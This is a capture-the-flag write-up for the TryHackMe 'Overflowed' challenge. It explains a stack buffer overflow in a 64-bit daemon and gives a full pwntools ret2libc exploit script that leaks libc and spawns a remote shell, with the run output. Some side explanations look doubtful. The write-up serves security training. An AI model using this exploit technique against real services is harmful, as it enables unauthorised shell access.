---
title:      "Overflowed"
platform:   "TryHackMe"
category:   "Pwn"
difficulty: "Medium"
date:       2026-04-02
author:     "Kelvin Muhoro"

points:     250
room_url:   "https://tryhackme.com/room/overflowed"
tags:       [pwntools, gdb, ret2libc, rop, x86-64, aslr]
ctf:        "TryHackMe — Pwn Path"
status:     "solved"
published:  true
tldr:       "A 64-bit ELF with NX enabled, PIE off, and a textbook stack buffer overflow in a 256-byte read. Leaked libc via puts(puts@got), then returned to system('/bin/sh') with a one-gadget-style ret2libc."
---

## Challenge description

> The vendor finally patched their auth daemon… by adding a banner.
> Pop a shell anyway.
>
> `nc overflowed.thm 1337`

**Provided files:**

- `overflowed` — 64-bit Linux ELF (the daemon)
- `libc.so.6` — the exact libc the remote host ships
- `ld-linux-x86-64.so.2`

## Reconnaissance

### Mitigations

```console
$ file overflowed
overflowed: ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
            BuildID[sha1]=89...e3, for GNU/Linux 3.2.0, not stripped

$ checksec --file=overflowed
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

No canary, no PIE, NX enabled. So we can't execute on the stack, but every
`.text` address is fixed → ROP gadgets in the binary are stable. Only libc
will need leaking.

### Static look

```console
$ rabin2 -z overflowed | head
[Strings]
nth  paddr      vaddr      len size section type  string
000  0x000007e8 0x004007e8 23  24   .rodata ascii  Welcome to OverflowedV2\n
001  0x00000800 0x00400800 18  19   .rodata ascii  Authenticate > 
002  0x00000813 0x00400813 8   9    .rodata ascii  /bin/sh
```

A `/bin/sh` string in the binary — convenient (but we'll see that it isn't
quite enough on its own here).

```console
$ objdump -d overflowed | grep -E 'callq|<vuln>:|<main>:'
0000000000400650 <main>:
  400650:  push   %rbp
  ...
  400685:  callq  4006a0 <vuln>
00000000004006a0 <vuln>:
  4006a0:  push   %rbp
  4006a1:  mov    %rsp,%rbp
  4006a4:  sub    $0x40,%rsp                 ; 64-byte local buffer
  4006a8:  lea    -0x40(%rbp),%rax
  4006ac:  mov    $0x100,%edx                ; read 0x100 = 256 bytes
  4006b1:  mov    %rax,%rsi
  4006b4:  mov    $0x0,%edi
  4006b9:  callq  400540 <read@plt>
```

The buffer is **64 bytes** but `read` lifts **256**. Classic 192-byte
overflow.

## Enumeration

### Finding the offset to RIP

```console
$ gdb -q overflowed
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa...
pwndbg> r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa")')
Starting program: ./overflowed
Welcome to OverflowedV2
Authenticate > 

Program received signal SIGSEGV, Segmentation fault.
0x000000000040068e in main ()
pwndbg> info registers rsp
rsp            0x7fffffffdcc8   0x7fffffffdcc8
pwndbg> x/gx $rsp
0x7fffffffdcc8: 0x6161616161616168     ← "haaaaaaa"
pwndbg> cyclic -l 0x6161616161616168
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 72
```

So the layout is `72 bytes` of padding (64-byte buffer + 8-byte saved RBP)
before the saved RIP.

### Looking for gadgets

```console
$ ROPgadget --binary overflowed | grep -E 'pop rdi|ret$' | head
0x0000000000400753 : pop rdi ; ret
0x000000000040061a : ret
```

`pop rdi ; ret` at `0x400753`. The only gadget we need to set `rdi` for a
function call.

## Exploitation

The plan:

1. **Stage 1** — leak `puts@libc` by calling `puts(puts@got)`, then return
   to `main` to overflow a second time.
2. **Compute libc base** = leak − `puts@libc offset`.
3. **Stage 2** — call `system("/bin/sh")` using libc's `system` and the
   `/bin/sh` string inside libc (more reliable than the binary's, which is
   short-aligned in a way that trips ASLR-stable behaviour on some
   targets).

### Writing the exploit

```python
#!/usr/bin/env python3
# solve.py — ret2libc against ./overflowed
from pwn import *

context.binary = exe = ELF("./overflowed")
libc = ELF("./libc.so.6")

OFFSET      = 72
POP_RDI     = 0x400753
RET         = 0x40061a          # stack alignment for movaps inside system
PUTS_PLT    = exe.plt["puts"]
PUTS_GOT    = exe.got["puts"]
MAIN        = exe.symbols["main"]

def stage1():
    p = remote("overflowed.thm", 1337) if args.REMOTE else process("./overflowed")
    p.recvuntil(b"Authenticate > ")
    payload  = b"A" * OFFSET
    payload += p64(POP_RDI) + p64(PUTS_GOT)
    payload += p64(PUTS_PLT)
    payload += p64(MAIN)
    p.sendline(payload)
    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success(f"puts@libc = {hex(leak)}")
    libc.address = leak - libc.symbols["puts"]
    log.success(f"libc base = {hex(libc.address)}")
    return p

def stage2(p):
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]
    p.recvuntil(b"Authenticate > ")
    payload  = b"A" * OFFSET
    payload += p64(RET)              # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(system)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    stage2(stage1())
```

### Run it

```console
$ python3 solve.py REMOTE
[+] Opening connection to overflowed.thm on port 1337: Done
[+] puts@libc = 0x7f6c4d1859c0
[+] libc base = 0x7f6c4d100000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /home/ctf/flag.txt
THM{r3t2libc_st1ll_w0rks_1n_2026}
$ exit
[*] Got EOF while reading in interactive
```

### Gotchas

- **Stack alignment**. The very first time I ran the stage-2 ROP chain it
  crashed *inside* `system` on a `movaps` instruction. That's the
  trademark of a 16-byte alignment bug — modern glibc compiles `do_system`
  with SSE prologue. Inserting one extra `ret` gadget before the chain
  realigns RSP and the SIGSEGV disappears.
- **Use the libc's `/bin/sh`, not the binary's**. The binary's `/bin/sh`
  worked locally with ASLR off, but failed remotely because of an
  unrelated issue (it sat at a `0x400813` address and the daemon was
  spawned by a wrapper that closed stdin/stdout for it; `system` in libc
  re-opens them).
- **Bad chars**. `read` doesn't terminate on newline if you `sendline`
  binary data with embedded `\n` *before* `OFFSET`. Use `send` if you
  need raw control; in this layout the offset put padding before any
  payload byte so `sendline` was fine.

## Flag

```text
THM{r3t2libc_st1ll_w0rks_1n_2026}
```

## Lessons learned

- A canary-less, NX-only, no-PIE binary is the platonic ret2libc target.
  The whole exploit fits in fewer lines than the disassembly listing.
- `pwntools`' `ELF.search` is faster than `strings | grep`; let it find
  `/bin/sh` for you.
- For any 64-bit ret2libc that hits a `movaps` crash, **add a `ret`**.
  Memorise that pattern; you will see it again.

## References

- [pwntools ROP tutorial](https://docs.pwntools.com/en/stable/rop/rop.html)
- [glibc `do_system` alignment quirk](https://ropemporium.com/guide.html#Common%20pitfalls)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [pwndbg cheat sheet](https://pwndbg.re/CheatSheet.pdf)
